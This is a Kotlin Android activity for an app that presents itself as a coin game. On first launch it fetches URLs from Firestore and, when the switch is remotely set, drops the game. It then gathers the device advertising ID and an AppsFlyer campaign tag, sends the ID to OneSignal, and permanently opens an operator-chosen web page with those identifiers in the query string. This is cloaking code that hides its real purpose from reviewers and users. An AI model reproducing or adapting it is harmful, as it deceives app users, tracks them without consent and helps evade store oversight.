package com.croooownthreecoinsssss

import android.app.PendingIntent
import android.content.Intent
import android.content.SharedPreferences
import android.content.res.Resources
import android.graphics.BitmapFactory
import android.graphics.Color
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import android.view.View
import android.webkit.WebView
import androidx.browser.customtabs.CustomTabsIntent
import com.croooownthreecoinsssss.PreferenceHelper.APPSFLYER_ID
import com.croooownthreecoinsssss.PreferenceHelper.FIRST_OPEN
import com.croooownthreecoinsssss.PreferenceHelper.GAME_START
import com.croooownthreecoinsssss.PreferenceHelper.NAMING_SUBS
import com.croooownthreecoinsssss.PreferenceHelper.STATE_ADS
import com.croooownthreecoinsssss.PreferenceHelper.URL_LINK
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.android.gms.common.GooglePlayServicesNotAvailableException
import com.google.android.gms.common.GooglePlayServicesRepairableException
import com.google.androidbrowserhelper.trusted.TwaLauncher
import com.google.firebase.BuildConfig
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.ktx.Firebase
import com.onesignal.OneSignal
import io.ktor.client.HttpClient
import io.ktor.client.engine.cio.CIO
import io.ktor.client.plugins.ClientRequestException
import io.ktor.client.request.get
import io.ktor.http.HttpStatusCode
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.IOException
import java.util.Timer
import java.util.TimerTask
import kotlin.coroutines.CoroutineContext

class MainActivity : AppCompatActivity(), CoroutineScope {

    var GAID: String? = null
    var URL: String? = null
    var URL_FINAL: String? = null
    var prefs: SharedPreferences? = null
    var naming: String? = null
    private var job: Job = Job()
    override val coroutineContext: CoroutineContext
        get() = Dispatchers.Main + job

    override fun onDestroy() {
        super.onDestroy()
        job.cancel()
    }

    lateinit var webView: WebView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val db = Firebase.firestore
        prefs = PreferenceHelper.defaultPreference(applicationContext)
        if (prefs?.FIRST_OPEN == false) {
            prefs?.FIRST_OPEN = true
            setContentView(R.layout.load_layout)
            db.collection("link")
                .get()
                .addOnSuccessListener { result ->
                    for (document in result) {
                        //Log.d("TAG2", "${document.id} => ${document.data}")
                        Log.d("TAG2", document.data["first"] as String)
                        Log.d("TAG2", document.data["second"] as String)
                        URL = document.data["first"] as String
                        URL_FINAL = document.data["second"] as String
                        if (URL != "google.com" && URL!!.isNotEmpty() && URL_FINAL != "google.com" && URL_FINAL!!.isNotEmpty()) {

                            prefs?.STATE_ADS = true
                            prefs?.GAME_START = false
                            launch {
                                gaidAsync()
                            }
                        } else {
                            prefs?.STATE_ADS = false
                            prefs?.GAME_START = true
                            setContentView(R.layout.activity_main)
                        }
                    }
                }
                .addOnFailureListener { exception ->
                    Log.w("TAG2", "Error getting documents.", exception)
                    prefs?.STATE_ADS = false
                    prefs?.GAME_START = true
                    setContentView(R.layout.activity_main)
                }
        } else {
            if (prefs?.STATE_ADS == true) {
                openV()
            } else if (prefs?.GAME_START == true) {
                setContentView(R.layout.activity_main)
            }
        }
    }

    fun handler(view: View) {
        if (view.tag == "game") startActivity(Intent(applicationContext, Game::class.java))
        else {
            val uri = Uri.parse(applicationContext.getString(R.string.POLICY))
            val launcher = TwaLauncher(this)
            launcher.launch(uri)
            finish()
        }
    }

    fun makeRequest() {
        launch(Dispatchers.Main) {
            val client = HttpClient(CIO)

            try {
                val response2: io.ktor.client.statement.HttpResponse = client.get(URL!!)
                if (response2.status == HttpStatusCode.OK) {
                    URL = URL_FINAL
                    parseRequestKeit()
                } else {
                    setContentView(R.layout.activity_main)
                    prefs?.STATE_ADS = false
                    prefs?.GAME_START = true
                    //return
                }
            } catch (e: ClientRequestException) {
                println("Error for request: ${e.message}")
            } finally {
                client.close()
            }
        }
    }
    fun openV(){
        val uri = Uri.parse(prefs?.URL_LINK) // Замените на свою ссылку

        val launcher = TwaLauncher(this)
        launcher.launch(uri)
        finish()

    }


    private fun parseRequestKeit() {
        var m = 0

        launch(Dispatchers.Main) {
            while (isActive) {
                withContext(Dispatchers.Main) {
                    naming = prefs?.NAMING_SUBS
                    if (naming != "nameSubs" && naming != "") {
                        if (naming != null && naming!!.contains("kurilwik3")) {
                            prefs?.URL_LINK =
                                URL + naming + "apso=" + prefs?.APPSFLYER_ID + "&reklamka=" + GAID
                            runOnUiThread {  openV() }
                        }
                        job.cancel()
                    } else {
                        m++
                        if (m > 22) {
                            prefs?.URL_LINK =
                                URL + "?apso=" + prefs?.APPSFLYER_ID + "&reklamka=" + GAID
                            runOnUiThread {  openV() }
                            job.cancel()
                        }
                    }
                }
                delay(500)
            }
        }

    }

    private fun <R> CoroutineScope.executeAsyncTask(
        onPreExecute: () -> Unit,
        doInBackground: () -> R,
        onPostExecute: (R) -> Unit
    ) = launch {
        onPreExecute()
        val result = withContext(Dispatchers.IO) { // runs in background thread without blocking the Main Thread
            doInBackground()
        }
        onPostExecute(result)
    }

    private suspend fun gaidAsync() = coroutineScope {

        executeAsyncTask(onPreExecute = {
            // ...
        }, doInBackground = {

            getGAID()
            makeRequest()
            "Result" // send data to "onPostExecute"
        }, onPostExecute = {
            // ... here "it" is a data returned from "doInBackground"
        })

        // }
    }


    fun getGAID()  {
        var idInfo: AdvertisingIdClient.Info? = null
        try {
            idInfo = AdvertisingIdClient.getAdvertisingIdInfo(
                applicationContext
            )
        } catch (e: GooglePlayServicesNotAvailableException) {
            e.printStackTrace()
        } catch (e: GooglePlayServicesRepairableException) {
            e.printStackTrace()
        } catch (e: IOException) {
            e.printStackTrace()
        }
        try {
            GAID = idInfo!!.id
            OneSignal.sendTag("ad_id", GAID)
        } catch (e: NullPointerException) {
            e.printStackTrace()
        }

    }
}